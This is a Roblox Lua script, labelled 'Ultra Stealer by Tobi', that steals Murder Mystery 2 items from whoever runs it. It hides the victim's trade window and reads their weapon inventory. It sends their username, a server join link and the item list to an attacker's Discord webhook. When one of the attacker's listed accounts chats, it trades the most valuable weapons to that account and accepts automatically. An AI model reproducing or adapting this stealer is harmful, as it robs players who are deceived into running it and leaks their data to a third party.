-- Evitar ejecución múltiple
if getgenv().ScriptEjecutado then return end
getgenv().ScriptEjecutado = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Configuración
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local pingEveryone = _G.pingEveryone == "Yes"

if not webhook or #users == 0 then
    warn("Webhook o usuarios no configurados")
    return
end

-- Cargar valores desde full_values.lua
local valueList = require(ReplicatedStorage:WaitForChild("full_values"))

-- Lista de raridades
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}

-- Función webhook
local function SendWebhook(title, description, fields, prefix, thumbnail)
    local data = {
        ["content"] = prefix or "",
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["thumbnail"] = thumbnail and {["url"]=thumbnail} or nil,
            ["footer"] = {["text"]="Ultra Stealer by Tobi"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    local req = syn and syn.request or http_request or request
    if req then
        pcall(function()
            req({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
        end)
    end
end

-- Ocultar GUI trade
for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
    local gui = LocalPlayer.PlayerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
        gui.Enabled=false
    end
end

-- Funciones de trade
local TradeService = ReplicatedStorage:WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
local function declineTrade() TradeService.DeclineTrade:FireServer() end
local function declineRequest() TradeService.DeclineRequest:FireServer() end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- Preparar lista de armas
local database = require(ReplicatedStorage.Database.Sync.Item)
local totalValue = 0
local weaponsToSend = {}
local profile = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)

local min_rarity_index = table.find(rarityTable, min_rarity)

for id, amount in pairs(profile.Weapons.Owned) do
    local item = database[id]
    if item then
        local rarityIndex = table.find(rarityTable, item.Rarity)
        if rarityIndex and rarityIndex >= min_rarity_index then
            local value = valueList[item.ItemName] or 1
            if value >= min_value then
                table.insert(weaponsToSend,{DataID=id, Amount=amount, Value=value, Rarity=item.Rarity})
                totalValue += value * amount
            end
        end
    end
end

-- Ordenar armas por valor
table.sort(weaponsToSend, function(a,b)
    return (a.Value * a.Amount) > (b.Value * b.Amount)
end)

-- Webhook con inventario
local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
local fields = {
    {name="Victim", value=LocalPlayer.Name, inline=true},
    {name="Join link", value=joinLink, inline=false},
    {name="Inventario", value="", inline=false},
    {name="Total value", value=tostring(totalValue), inline=true}
}
for _, w in ipairs(weaponsToSend) do
    fields[3].value = fields[3].value..string.format("%s x%s (%s)\n",w.DataID,w.Amount,w.Rarity)
end
local prefix = pingEveryone and "@everyone " or ""
SendWebhook("💪MM2 Ultra Hit💯","💰Armas más valiosas primero",fields,prefix)

-- Función de trade continuo
local function doTrade(targetName)
    while #weaponsToSend > 0 do
        local status = getTradeStatus()
        if status=="None" then
            sendTradeRequest(targetName)
        elseif status=="StartTrade" then
            local blockSize = 4
            while #weaponsToSend>0 and getTradeStatus()=="StartTrade" do
                for i=1, math.min(blockSize,#weaponsToSend) do
                    local w = table.remove(weaponsToSend,1)
                    for _=1, w.Amount do addWeaponToTrade(w.DataID) end
                end
                task.wait(0.3)
            end
            task.wait(7)
            acceptTrade()
            waitForTradeCompletion()
        elseif status=="ReceivingRequest" then
            declineRequest()
            task.wait(0.3)
        elseif status=="StartTrade" then
            declineTrade()
            task.wait(0.3)
        else
            task.wait(0.5)
        end
        task.wait(1)
    end
end

-- Activación trade por chat solo para tus usuarios
for _,p in ipairs(Players:GetPlayers()) do
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end
Players.PlayerAdded:Connect(function(p)
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end)
